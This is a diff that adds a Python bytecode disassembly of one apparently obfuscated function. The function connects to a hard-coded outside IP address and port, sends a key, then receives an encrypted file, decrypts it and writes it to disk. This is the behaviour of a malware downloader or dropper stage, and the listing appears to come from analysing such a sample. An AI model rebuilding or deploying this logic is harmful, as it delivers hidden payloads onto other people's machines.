@@ -1,0 +1,292 @@
+     RESUME                   0
+
+     NOP
+
+L1:     LOAD_GLOBAL              0 (socket)
+
+     LOAD_ATTR                0 (socket)
+
+     PUSH_NULL
+
+     LOAD_GLOBAL              0 (socket)
+
+     LOAD_ATTR                2 (AF_INET)
+
+     LOAD_GLOBAL              0 (socket)
+
+     LOAD_ATTR                4 (SOCK_STREAM)
+
+     CALL                     2
+
+     STORE_FAST               0 (client2)
+
+     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR                7 (connect + NULL|self)
+
+     LOAD_CONST               1 (('13.61.7.218', 54163))
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_CONST               2 ('')
+
+     LOAD_ATTR                9 (join + NULL|self)
+
+     LOAD_CONST               3 (<code object <genexpr> at 0x7578249b3280, file "Py-Fuscate", line 55>)
+
+     MAKE_FUNCTION
+
+     LOAD_GLOBAL             11 (range + NULL)
+
+     LOAD_CONST               4 (16)
+
+     CALL                     1
+
+     GET_ITER
+
+     CALL                     0
+
+     CALL                     1
+
+     STORE_FAST               1 (k)
+
+     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR               13 (send + NULL|self)
+
+     LOAD_FAST                1 (k)
+
+     LOAD_ATTR               15 (encode + NULL|self)
+
+     CALL                     0
+
+     CALL                     1
+
+     POP_TOP
+
+     NOP
+
+     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR               17 (recv + NULL|self)
+
+     LOAD_GLOBAL             18 (BUFFER_SIZE)
+
+     CALL                     1
+
+     STORE_FAST               2 (enc_received)
+
+     LOAD_GLOBAL             21 (dec_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST     33 (enc_received, k)
+
+     CALL                     2
+
+     LOAD_ATTR               23 (decode + NULL|self)
+
+     CALL                     0
+
+     STORE_FAST               3 (received)
+
+     LOAD_FAST                3 (received)
+
+     LOAD_ATTR               25 (split + NULL|self)
+
+     LOAD_GLOBAL             26 (SEPARATOR)
+
+     CALL                     1
+
+     UNPACK_SEQUENCE          2
+
+     STORE_FAST_STORE_FAST   69 (filename, filesize)
+
+     LOAD_GLOBAL             29 (enc_mes + NULL)
+
+     LOAD_CONST               5 ('ok2')
+
+     LOAD_FAST                1 (k)
+
+     CALL                     2
+
+     STORE_FAST               6 (ok_enc)
+
+     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR               13 (send + NULL|self)
+
+     LOAD_FAST                6 (ok_enc)
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_CONST               6 (0)
+
+     STORE_FAST               7 (total_bytes)
+
+     LOAD_CONST               7 (b'')
+
+     STORE_FAST               8 (msg)
+
+     LOAD_FAST                7 (total_bytes)
+
+     LOAD_GLOBAL             31 (int + NULL)
+
+     LOAD_FAST                5 (filesize)
+
+     CALL                     1
+
+     COMPARE_OP              18 (bool(<))
+
+     POP_JUMP_IF_FALSE       56 (to L4)
+
+L2:     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR               17 (recv + NULL|self)
+
+     LOAD_GLOBAL             18 (BUFFER_SIZE)
+
+     CALL                     1
+
+     STORE_FAST               9 (bytes_read)
+
+     LOAD_FAST_LOAD_FAST    137 (msg, bytes_read)
+
+     BINARY_OP               13 (+=)
+
+     STORE_FAST               8 (msg)
+
+     LOAD_FAST                7 (total_bytes)
+
+     LOAD_GLOBAL             33 (len + NULL)
+
+     LOAD_FAST                9 (bytes_read)
+
+     CALL                     1
+
+     BINARY_OP               13 (+=)
+
+     STORE_FAST               7 (total_bytes)
+
+     LOAD_FAST                7 (total_bytes)
+
+     LOAD_GLOBAL             31 (int + NULL)
+
+     LOAD_FAST                5 (filesize)
+
+     CALL                     1
+
+     COMPARE_OP              18 (bool(<))
+
+     POP_JUMP_IF_FALSE        2 (to L4)
+
+L3:     JUMP_BACKWARD           56 (to L2)
+
+L4:     LOAD_GLOBAL             21 (dec_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST    129 (msg, k)
+
+     CALL                     2
+
+     STORE_FAST              10 (decr_file)
+
+     LOAD_GLOBAL             35 (open + NULL)
+
+     LOAD_FAST                4 (filename)
+
+     LOAD_CONST               8 ('wb')
+
+     CALL                     2
+
+     BEFORE_WITH
+
+L5:     STORE_FAST              11 (f)
+
+     LOAD_FAST               11 (f)
+
+     LOAD_ATTR               37 (write + NULL|self)
+
+     LOAD_FAST               10 (decr_file)
+
+     CALL                     1
+
+     POP_TOP
+
+L6:     LOAD_CONST               0 (None)
+
+     LOAD_CONST               0 (None)
+
+     LOAD_CONST               0 (None)
+
+     CALL                     2
+
+     POP_TOP
+
+L7:     NOP
+
+     LOAD_FAST                0 (client2)
+
+     LOAD_ATTR               39 (close + NULL|self)
+
+     CALL                     0
+
+     POP_TOP
+
+L8:     RETURN_CONST             0 (None)
+
+L9:     PUSH_EXC_INFO
+
+     WITH_EXCEPT_START
+
+     TO_BOOL
+
+     POP_JUMP_IF_TRUE         1 (to L10)
+
+     RERAISE                  2
+
+L10:     POP_TOP
+
+L11:     POP_EXCEPT
+
+     POP_TOP
+
+     POP_TOP
+
+     JUMP_BACKWARD_NO_INTERRUPT 32 (to L7)
+
+L12:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L13:     PUSH_EXC_INFO
+
+     POP_TOP
+
+     LOAD_FAST_CHECK          0 (client2)
+
+     LOAD_ATTR               13 (send + NULL|self)
+
+     LOAD_CONST               9 ('Error transporting file')
+
+     LOAD_ATTR               15 (encode + NULL|self)
+
+     CALL                     0
+
+     CALL                     1
+
+     POP_TOP
+
+L14:     POP_EXCEPT
+
+     RETURN_CONST             0 (None)
+
+L15:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
